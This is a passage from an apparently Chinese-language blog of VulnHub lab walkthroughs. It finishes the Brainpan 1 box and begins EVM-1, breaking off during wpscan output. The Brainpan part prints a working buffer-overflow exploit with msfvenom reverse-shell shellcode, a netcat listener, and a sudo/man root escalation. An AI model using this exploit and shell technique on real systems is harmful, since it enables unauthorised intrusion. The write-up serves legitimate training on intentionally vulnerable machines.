class="line"> Directory of C:\Users\HASEE\Desktop\brainpan1</span><br><span class="line"></span><br><span class="line">2020/02/01  01:21    &lt;DIR&gt;          .</span><br><span class="line">2020/02/01  01:21    &lt;DIR&gt;          ..</span><br><span class="line">2020/01/31  20:48            21,190 brainpan.exe</span><br><span class="line">2020/02/01  01:21             2,166 etfuzz.py</span><br><span class="line">               2 File(s)         23,356 bytes</span><br><span class="line">               2 Dir(s)  151,135,014,912 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;net user</span><br><span class="line">net user</span><br><span class="line"></span><br><span class="line">User accounts <span class="keyword">for</span> \\IZ94TYLSQ69Z</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            ASPNET                   DefaultAccount           </span><br><span class="line">Guest                    HASEE                    WDAGUtilityAccount </span><br></pre></td></tr></table></figure>

<ul>
<li>注意：这个shell是测试电脑的shell，如果乱码，输入chcp 65001就不会乱码了</li>
</ul>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>好东西…。现在有一个reverse TCP连接到我们的Windows计算机。是时候创建一个Linux reverse shell了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.102 LPORT=443 R -e x86/alpha_upper -b &#x27;\x00&#x27; -f python</span></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86/alpha_upper</span><br><span class="line">x86/alpha_upper succeeded with size 205 (iteration=0)</span><br><span class="line">x86/alpha_upper chosen with final size 205</span><br><span class="line">Payload size: 205 bytes</span><br><span class="line">Final size of python file: 1007 bytes</span><br><span class="line">buf =  b<span class="string">&quot;&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x89\xe5\xd9\xcb\xd9\x75\xf4\x58\x50\x59\x49\x49\x49&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x4a\x49\x30\x31\x49\x4b\x5a\x57\x4b\x53\x31\x43\x47&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x33\x46\x33\x53\x5a\x53\x32\x4b\x39\x4b\x51\x38\x30&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x52\x46\x58\x4d\x4d\x50\x4a\x33\x36\x39\x48\x30\x37&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x4f\x58\x4d\x4d\x50\x30\x49\x44\x39\x5a\x59\x35\x38&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x49\x50\x59\x38\x30\x38\x45\x36\x32\x48\x44\x42\x33&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x30\x35\x51\x4f\x4b\x4b\x39\x4b\x51\x38\x30\x42\x46&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x56\x30\x36\x31\x30\x53\x4f\x43\x33\x33\x4c\x49\x4b&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x51\x38\x4d\x4d\x50\x50\x52\x43\x58\x52\x4e\x46\x4f&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x44\x33\x52\x48\x53\x58\x36\x4f\x46\x4f\x32\x42\x53&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x59\x4d\x59\x4a\x43\x31\x42\x31\x43\x4c\x49\x4d\x31&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x38\x30\x34\x4b\x58\x4d\x4b\x30\x41\x41&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import sys,socket</span><br><span class="line"> </span><br><span class="line">victim = <span class="string">&#x27;192.168.56.115&#x27;</span></span><br><span class="line">port = 9999</span><br><span class="line"> </span><br><span class="line">junk = <span class="string">&quot;\x41&quot;</span> * 524</span><br><span class="line">eip = <span class="string">&quot;\xf3\x12\x17\x31&quot;</span></span><br><span class="line">buf =  b<span class="string">&quot;\x90&quot;</span> * 13</span><br><span class="line">buf += b<span class="string">&quot;\x89\xe5\xd9\xcb\xd9\x75\xf4\x58\x50\x59\x49\x49\x49&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x4a\x49\x30\x31\x49\x4b\x5a\x57\x4b\x53\x31\x43\x47&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x33\x46\x33\x53\x5a\x53\x32\x4b\x39\x4b\x51\x38\x30&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x52\x46\x58\x4d\x4d\x50\x4a\x33\x36\x39\x48\x30\x37&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x4f\x58\x4d\x4d\x50\x30\x49\x44\x39\x5a\x59\x35\x38&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x49\x50\x59\x38\x30\x38\x45\x36\x32\x48\x44\x42\x33&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x30\x35\x51\x4f\x4b\x4b\x39\x4b\x51\x38\x30\x42\x46&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x56\x30\x36\x31\x30\x53\x4f\x43\x33\x33\x4c\x49\x4b&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x51\x38\x4d\x4d\x50\x50\x52\x43\x58\x52\x4e\x46\x4f&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x44\x33\x52\x48\x53\x58\x36\x4f\x46\x4f\x32\x42\x53&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x59\x4d\x59\x4a\x43\x31\x42\x31\x43\x4c\x49\x4d\x31&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x38\x30\x34\x4b\x58\x4d\x4b\x30\x41\x41&quot;</span></span><br><span class="line"> </span><br><span class="line">payload = junk + eip + buf</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"> </span><br><span class="line">try:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Connecting to &quot;</span> + str(victim)</span><br><span class="line">  s.connect((victim, port))</span><br><span class="line">  s.recv(1024)</span><br><span class="line"> </span><br><span class="line">  <span class="comment"># Send payload </span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Sending payload.... &quot;</span>,</span><br><span class="line">  s.send(payload)</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Done&quot;</span></span><br><span class="line"> </span><br><span class="line">except:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Unable to connect to &quot;</span> + str(victim)</span><br><span class="line">  sys.exit(0)</span><br></pre></td></tr></table></figure>

<p>使用受害者主机的IP地址和更新的Shellcode更新PoC脚本，在端口443上创建一个新的netcat侦听器，并相应地执行，成功的返回了shell。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 443</span></span><br><span class="line">listening on [any] 443 ...</span><br><span class="line">192.168.56.115: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.115] 39737</span><br><span class="line">id</span><br><span class="line">uid=1002(puck) gid=1002(puck) groups=1002(puck)</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">puck@brainpan:/home/puck$ id</span><br><span class="line">id</span><br><span class="line">uid=1002(puck) gid=1002(puck) groups=1002(puck)</span><br><span class="line">puck@brainpan:/home/puck$ whoami</span><br><span class="line">whoami</span><br><span class="line">puck</span><br><span class="line">puck@brainpan:/home/puck$ ls</span><br><span class="line">ls</span><br><span class="line">checksrv.sh  web</span><br><span class="line">puck@brainpan:/home/puck$</span><br></pre></td></tr></table></figure>

<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>成功！现在，受害者计算机上有一个特权低的shell。继续。查看主目录，看是否有有趣的事情……。不。唯一值得注意的是，有一个脚本可以在死时重新启动Web服务，以及在端口10000上运行的Web服务的根目录。sudo可以使用任何特殊权限吗？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan:/home$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> puck on this host:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User puck may run the following commands on this host:</span><br><span class="line">    (root) NOPASSWD: /home/anansi/bin/anansi_util</span><br></pre></td></tr></table></figure>

<p>anansi_util NOPASSWD？很有趣。仔细看看。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan:/home$ sudo /home/anansi/bin/anansi_util</span><br><span class="line">sudo /home/anansi/bin/anansi_util</span><br><span class="line">Usage: /home/anansi/bin/anansi_util [action]</span><br><span class="line">Where [action] is one of:</span><br><span class="line">  - network</span><br><span class="line">  - proclist</span><br><span class="line">  - manual [<span class="built_in">command</span>]</span><br></pre></td></tr></table></figure>

<ul>
<li>manual [command]部分。看看是否可以使用root特权运行[command]。</li>
</ul>
<p>成功的提权并找到了flag，吊炸天！！！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan:/home$ sudo /home/anansi/bin/anansi_util manual /bin/bash</span><br><span class="line">sudo /home/anansi/bin/anansi_util manual /bin/bash</span><br><span class="line">/usr/bin/man: manual-/bin/bash: No such file or directory</span><br><span class="line">/usr/bin/man: manual_/bin/bash: No such file or directory</span><br><span class="line">No manual entry <span class="keyword">for</span> manual</span><br><span class="line">WARNING: terminal is not fully functional</span><br><span class="line">-  (press RETURN)</span><br><span class="line">BASH(1)                                                                BASH(1)</span><br><span class="line"></span><br><span class="line">NAME</span><br><span class="line">       bash - GNU Bourne-Again SHell</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       bash [options] [file]</span><br><span class="line"></span><br><span class="line">COPYRIGHT</span><br><span class="line">       Bash is Copyright (C) 1989-2011 by the Free Software Foundation, Inc.</span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">       Bash  is  an  sh-compatible  <span class="built_in">command</span> language interpreter that executes</span><br><span class="line">       commands <span class="built_in">read</span> from the standard input or from a file.  Bash also incor‐</span><br><span class="line">       porates useful features from the Korn and C shells (ksh and csh).</span><br><span class="line"></span><br><span class="line">       Bash  is  intended  to  be a conformant implementation of the Shell and</span><br><span class="line">       Utilities portion  of  the  IEEE  POSIX  specification  (IEEE  Standard</span><br><span class="line">       1003.1).  Bash can be configured to be POSIX-conformant by default.</span><br><span class="line"></span><br><span class="line">OPTIONS</span><br><span class="line">       All  of  the  single-character shell options documented <span class="keyword">in</span> the descrip‐</span><br><span class="line">       tion of the <span class="built_in">set</span> <span class="built_in">builtin</span> <span class="built_in">command</span> can be used as options when  the  shell</span><br><span class="line"> Manual page bash(1) line 1 (press h <span class="keyword">for</span> <span class="built_in">help</span> or q to quit)!/bin/bash</span><br><span class="line">!/bin/bash</span><br><span class="line">root@brainpan:/usr/share/man<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@brainpan:/usr/share/man<span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">root@brainpan:/usr/share/man<span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">root@brainpan:~<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">b.txt</span><br><span class="line">root@brainpan:~<span class="comment"># cat b.txt</span></span><br><span class="line">cat b.txt</span><br><span class="line">_|                            _|                                        </span><br><span class="line">_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><br><span class="line">_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><br><span class="line">                                            _|                          </span><br><span class="line">                                            _|</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                              http://www.techorganic.com </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@brainpan:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>W00T !!!!!root！二进制文件允许以root用户身份查询联机帮助页，因此，可以使用man的内置功能来内联运行命令，例如上述输出中的！/bin/bash。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub198.jpg"></p>
<h4 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h4><ul>
<li>缓冲区溢出</li>
<li>od调试程序</li>
<li>python模糊测试脚本测试段错误</li>
<li>msf脚本生成填充缓冲区的字节</li>
<li>msfvenom生成reverse shell的python shellcode版本的代码</li>
<li>覆盖eip将恶意shellcode代码放入esp取得reverseshell</li>
<li>man内置功能内联运行命令提权</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub-walkthrough[EVM-1]</title>
    <url>/2020/05/23/evm/</url>
    <content><![CDATA[<h3 id="name"><a href="#name" class="headerlink" title="name"></a>name</h3><p>Name: EVM: 1<br>Date release: 2 Nov 2019</p>
<h3 id="download"><a href="#download" class="headerlink" title="download"></a>download</h3><p>Download: <span class="exturl" data-url="aHR0cHM6Ly9tZWdhLm56LyNGIXBWVjFDS1lJIUFCQ3BRMHFVZGJ1WUlzemYwbGpIMXc=">https://mega.nz/#F!pVV1CKYI!ABCpQ0qUdbuYIszf0ljH1w<i class="fa fa-external-link-alt"></i></span><br>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9ldm0vRVZNLm92YQ==">https://download.vulnhub.com/evm/EVM.ova<i class="fa fa-external-link-alt"></i></span><br>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9ldm0vRVZNLm92YS50b3JyZW50">https://download.vulnhub.com/evm/EVM.ova.torrent<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>This is super friendly box intended for Beginner’s</p>
<p>This may work better with VirtualBox than VMware</p>
<a id="more"></a>

<h3 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h3><p>first use nmap as usual</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.*</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.103</span><br><span class="line">Host is up (0.00026s latency).</span><br><span class="line">MAC Address: 08:00:27:90:6F:5B (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -sC -T4 -p- -v -A 192.168.56.103</span></span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 a2:d3:34:13:62:b1:18:a3:dd:db:35:c5:5a:b7:c0:78 (RSA)</span><br><span class="line">|   256 85:48:53:2a:50:c5:a0:b7:1a:ee:a4:d8:12:8e:1c:ce (ECDSA)</span><br><span class="line">|_  256 36:22:92:c7:32:22:e3:34:51:bc:0e:74:9f:1c:db:aa (ED25519)</span><br><span class="line">53/tcp  open  domain      ISC BIND 9.10.3-P4 (Ubuntu Linux)</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: 9.10.3-P4-Ubuntu</span><br><span class="line">80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">110/tcp open  pop3        Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: PIPELINING TOP RESP-CODES CAPA UIDL SASL AUTH-RESP-CODE</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">143/tcp open  imap        Dovecot imapd</span><br><span class="line">|_imap-capabilities: ID OK LITERAL+ IDLE LOGIN-REFERRALS SASL-IR more ENABLE have listed post-login capabilities Pre-login IMAP4rev1 LOGINDISABLEDA0001</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">MAC Address: 08:00:27:90:6F:5B (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 0.003 days (since Sat May 23 02:15:27 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty=259 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: Host: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 1h19m58s, deviation: 2h18m33s, median: -1s</span><br><span class="line">| nbstat: NetBIOS name: UBUNTU-EXTERMEL, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| Names:</span><br><span class="line">|   UBUNTU-EXTERMEL&lt;00&gt;  Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   UBUNTU-EXTERMEL&lt;03&gt;  Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   UBUNTU-EXTERMEL&lt;20&gt;  Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)</span><br><span class="line">|   Computer name: ubuntu-extermely-vulnerable-m4ch1ine</span><br><span class="line">|   NetBIOS computer name: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: ubuntu-extermely-vulnerable-m4ch1ine</span><br><span class="line">|_  System time: 2020-05-23T02:20:13-04:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-05-23T06:20:13</span><br><span class="line">|_  start_date: N/A</span><br></pre></td></tr></table></figure>

<ul>
<li>Enumeration</li>
</ul>
<p>use dirb</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://192.168.56.103/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Mon May 25 06:24:07 2020</span><br><span class="line">URL_BASE: http://192.168.56.103/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.56.103/ ----</span><br><span class="line">+ http://192.168.56.103/index.html (CODE:200|SIZE:10821)                                            </span><br><span class="line">+ http://192.168.56.103/info.php (CODE:200|SIZE:83014)                                              </span><br><span class="line">+ http://192.168.56.103/server-status (CODE:403|SIZE:302)                                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/                                                     </span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/ ----</span><br><span class="line">+ http://192.168.56.103/wordpress/index.php (CODE:301|SIZE:0)                                       </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-admin/                                            </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-content/                                          </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-includes/                                         </span><br><span class="line">+ http://192.168.56.103/wordpress/xmlrpc.php (CODE:405|SIZE:42)                                     </span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-admin/ ----</span><br><span class="line">+ http://192.168.56.103/wordpress/wp-admin/admin.php (CODE:302|SIZE:0)                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-admin/css/                                        </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-admin/images/                                     </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-admin/includes/                                   </span><br><span class="line">+ http://192.168.56.103/wordpress/wp-admin/index.php (CODE:302|SIZE:0)                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-admin/js/                                         </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-admin/maint/                                      </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-admin/network/                                    </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-admin/user/                                       </span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-content/ ----</span><br><span class="line">+ http://192.168.56.103/wordpress/wp-content/index.php (CODE:200|SIZE:0)                            </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-content/plugins/                                  </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-content/themes/                                   </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-content/uploads/                                  </span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-includes/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-admin/css/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-admin/images/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-admin/includes/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-admin/js/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-admin/maint/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-admin/network/ ----</span><br><span class="line">+ http://192.168.56.103/wordpress/wp-admin/network/admin.php (CODE:302|SIZE:0)                      </span><br><span class="line">+ http://192.168.56.103/wordpress/wp-admin/network/index.php (CODE:302|SIZE:0)                      </span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-admin/user/ ----</span><br><span class="line">+ http://192.168.56.103/wordpress/wp-admin/user/admin.php (CODE:302|SIZE:0)                         </span><br><span class="line">+ http://192.168.56.103/wordpress/wp-admin/user/index.php (CODE:302|SIZE:0)                         </span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-content/plugins/ ----</span><br><span class="line">+ http://192.168.56.103/wordpress/wp-content/plugins/index.php (CODE:200|SIZE:0)                    </span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-content/themes/ ----</span><br><span class="line">+ http://192.168.56.103/wordpress/wp-content/themes/index.php (CODE:200|SIZE:0)                     </span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-content/uploads/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                               </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Mon May 25 06:24:47 2020</span><br><span class="line">DOWNLOADED: 36896 - FOUND: 14</span><br></pre></td></tr></table></figure>

<p>use wpscan for more information</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wpscan --url http://192.168.56.103/wordpress/ -e at -e ap -e u</span></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         WordPress Security Scanner by the WPScan Team</span></span><br><span class="line"><span class="string">                         Version 3.7.6</span></span><br><span class="line"><span class="string">       Sponsored by Automattic - https://automattic.com/</span></span><br><span class="line"><span class="string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span></span><br><span class="line"><span class="string">_______________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] URL: http://192.168.56.103/wordpress/</span></span><br><span class="line"><span class="string">[+] Started: Mon May 25 06:27:45 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Interesting Finding(s):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.103/wordpress/</span></span><br><span class="line"><span class="string"> | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)</span></span><br><span class="line"><span class="string"> | Found By: Headers (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] 